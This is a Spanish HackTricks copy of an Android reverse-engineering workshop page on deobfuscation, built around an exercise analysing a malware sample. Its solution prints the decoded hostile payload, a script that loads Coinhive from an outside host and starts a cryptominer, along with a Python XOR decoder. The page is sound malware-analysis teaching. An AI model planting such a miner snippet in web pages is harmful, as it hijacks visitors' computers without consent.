<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!

- Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obt√©n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Comparte tus trucos de hacking enviando PR al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


**Copiado de **[**https://maddiestone.github.io/AndroidAppRE/obfuscation.html**](https://maddiestone.github.io/AndroidAppRE/obfuscation.html)** (puedes encontrar soluciones all√≠)**

![Logo](https://maddiestone.github.io/AndroidAppRE/images/pinkandroid.png)

Hay muchas veces en las que la aplicaci√≥n que est√°s revirtiendo no ser√° tan directa como algunos de los ejemplos que hemos discutido. El desarrollador implementar√° una o m√°s t√©cnicas de ofuscaci√≥n para ocultar el comportamiento y/o la implementaci√≥n de su aplicaci√≥n. Esto puede ser por razones benignas y maliciosas.

Lo clave sobre la ofuscaci√≥n es recordar que si quieres desofuscarla, podr√°s hacerlo. La decisi√≥n clave no es si puedes o no, sino si vale la pena los recursos para desofuscarla.

La raz√≥n por la que siempre puedes desofuscar algo es porque en √∫ltima instancia, la CPU en alg√∫n momento tiene que ver el c√≥digo no ofuscado para ejecutarlo.

## C√≥mo desofuscar <a href="how-to-de-obfuscate" id="how-to-de-obfuscate"></a>

C√≥mo elijas desofuscar la aplicaci√≥n depender√° del m√©todo de ofuscaci√≥n, pero hay un par de t√©cnicas comunes que suelen funcionar bien. Aqu√≠, solo tocaremos las t√©cnicas de desofuscaci√≥n est√°tica ya que este taller solo cubre el an√°lisis/reversi√≥n est√°tica. Sin embargo, recuerda que ejecutar la aplicaci√≥n y analizarla din√°micamente puede ser otra gran manera de superar la ofuscaci√≥n.

Para la ofuscaci√≥n en el bytecode DEX (Java), una de las formas m√°s f√°ciles de desofuscar est√°ticamente es identificar los m√©todos de desofuscaci√≥n en la aplicaci√≥n y copiar su descompilaci√≥n en un archivo Java que luego se ejecuta en el archivo, cadenas, c√≥digo, etc. ofuscados.

Otra soluci√≥n tanto para Java como para c√≥digo nativo es transliterar el algoritmo de desofuscaci√≥n a Python o cualquier otro lenguaje de script con el que te sientas m√°s c√≥modo. Digo "transliterar" porque es importante recordar que no siempre necesitas \*entender\* el algoritmo de desofuscaci√≥n, solo necesitas una forma de ejecutarlo. Cubro esto con m√°s detalle en la charla "Desempaquetando el desempaquetador empaquetado" que est√° vinculada en la secci√≥n "M√°s ejemplos".

## Indicadores de ofuscaci√≥n <a href="indicators-of-obfuscation" id="indicators-of-obfuscation"></a>

Hay muchos tipos diferentes de ofuscaci√≥n y, por lo tanto, tantos tipos diferentes de indicadores para alertarte como analista de que es probable que una aplicaci√≥n est√© ofuscada, pero aqu√≠ hay algunos ejemplos con soluciones de an√°lisis est√°tico propuestas para desofuscar.

* Sin cadenas: Java y Android dependen en gran medida de las cadenas, por lo que si no ves ninguna o solo cadenas enmascaradas, es muy probable que las cadenas est√©n ofuscadas.
  * Soluci√≥n sugerida: Busca llamadas de m√©todo que tomen cadenas como argumento y rastrea de d√≥nde proviene ese argumento. En alg√∫n momento, el argumento de cadena pasar√° por un m√©todo de desofuscaci√≥n antes de que se pase a la API que toma el argumento de cadena.
* Cadenas enmascaradas: Las API de Java y Android requieren las cadenas de texto plano, no enmascaradas.
  * Soluci√≥n sugerida: Es probable que todas las cadenas enmascaradas se pasen a los mismos m√©todos antes de pasar a las API. Estos m√©todos son probablemente los m√©todos de desofuscaci√≥n.
* Archivos binarios en el directorio assets/ y llamadas DexClassLoader en la aplicaci√≥n: Probablemente desempaquetando y cargando c√≥digo adicional. (Tambi√©n podr√≠a estar descargando desde una ubicaci√≥n remota y luego cargando usando DexClassLoader)
  * Soluci√≥n sugerida: Identifica d√≥nde se lee el archivo y luego sigue el camino. Es probable que se desofusque r√°pidamente despu√©s de ser le√≠do.
* Bibliotecas nativas: no se pueden identificar las funciones JNI (no hay funciones llamadas Java\_ y no hay llamadas a RegisterNatives): Para ejecutar cualquier m√©todo nativo, JNI tiene que poder emparejar la funci√≥n en la biblioteca nativa con la declaraci√≥n del m√©todo nativo en Java y, por lo tanto, uno de los dos debe existir en alg√∫n momento.
  * Soluci√≥n sugerida: Comienza en el m√©todo JNI_OnLoad y busca una rutina de desofuscaci√≥n que cargue c√≥digo adicional.

## Ejercicio 7 - Desofuscaci√≥n de cadenas <a href="exercise-7---string-deobfuscation" id="exercise-7---string-deobfuscation"></a>

En este ejercicio, practicaremos la desofuscaci√≥n de cadenas para analizar una aplicaci√≥n. Para el ejercicio, usaremos la muestra en `~/samples/ClashOfLights.apk` en la VM. Esta muestra tiene el resumen SHA256 c403d2dcee37f80b6d51ebada18c409a9eae45416fe84cd0c1ea1d9897eae4e5.

### Objetivos <a href="goals" id="goals"></a>

Identificar cadenas ofuscadas y desarrollar una soluci√≥n para desofuscarla.

### Contexto del ejercicio <a href="exercise-context" id="exercise-context"></a>

Eres un analista de malware que revisa esta aplicaci√≥n para determinar si es malware. Te encuentras con una cadena de Javascript ofuscada que se est√° cargando y necesitas desofuscarla para determinar si la aplicaci√≥n es maliciosa. No puedes ejecutar la aplicaci√≥n din√°micamente y necesitas determinar est√°ticamente qu√© es el Javascript.

### Instrucciones <a href="instructions" id="instructions"></a>

1. Encuentra la cadena que necesitas desofuscar
2. Identifica la rutina que la desofusca.
3. Determina c√≥mo quieres escribir una soluci√≥n para desofuscar la cadena.
4. ¬°Hazlo! :)

### Soluci√≥n <a href="solution" id="solution"></a>

La cadena desofuscada es:
```
<script src="https://coinhive.com/lib/coinhive.min.js"></script><script>var miner = new CoinHive.Anonymous('nf24ZwEMmu0m1X6MgcOv48AMsIYErpFE', {threads: 2});miner.start();</script>
```
El script de Python que escrib√≠ para desofuscarlo es:
```
enc_str = "773032205849207A3831326F1351202E3B306B7D1E5A3B33252B382454173735266C3D3B53163735222D393B475C7A37222D7F38421B6A66643032205849206477303220584920643D2223725C503A3F39636C725F5C237A082C383C7950223F65023F3D5F4039353E3079755F5F666E1134141F5C4C64377A1B671F565A1B2C7F7B101F42700D1F39331717161574213F2B2337505D27606B712C7B0A543D342E317F214558262E636A6A6E1E4A37282233256C"

length = len(enc_str)
count = 0
dec_str = [0] * (length/2)
while (count < length):
    dec_str[count/2] = (int(enc_str[count], 16) << 4) + int(enc_str[count + 1], 16) & 0xFF
    count += 2
print dec_str


key = [75, 67, 81, 82, 49, 57, 84, 90]
enc_str = dec_str
count = 0
length = len(enc_str)
while (count < length):
    dec_str[count] = chr(enc_str[count] ^ key[count % len(key)])
    count += 1
print ''.join(dec_str)
```
## M√°s ejemplos <a href="more-examples" id="more-examples"></a>

He dado algunas charlas sobre la desofuscaci√≥n de aplicaciones de Android que incluyen una variedad de mecanismos de ofuscaci√≥n. En estas charlas, discuto las t√©cnicas avanzadas de ofuscaci√≥n, mi soluci√≥n para desofuscarlas, y las consideraciones y decisiones que tom√© al decidir c√≥mo quer√≠a desofuscar.

* BlackHat USA 2018: "Desempaquetando el Desempaquetador Empaquetado: Ingenier√≠a Inversa de una Biblioteca Anti-An√°lisis de Android" \[[video](https://www.youtube.com/watch?v=s0Tqi7fuOSU)]
  * Esta charla trata sobre la ingenier√≠a inversa de una de las bibliotecas nativas de anti-an√°lisis m√°s complejas que he visto utilizadas por una aplicaci√≥n de Android. Cubre principalmente t√©cnicas de ofuscaci√≥n en c√≥digo nativo.
* REcon 2019: "El camino hacia la carga √∫til: Edici√≥n de Android" \[[video](https://recon.cx/media-archive/2019/Session.005.Maddie_Stone.The_path_to_the_payload_Android_Edition-J3ZnNl2GYjEfa.mp4)]
  * Esta charla discute una serie de t√©cnicas de ofuscaci√≥n, √∫nicamente en c√≥digo Java, que una botnet de Android estaba utilizando para ocultar su comportamiento.


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øo quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!

- Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)

- Consigue el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)

- **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Comparte tus trucos de hacking enviando PRs al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
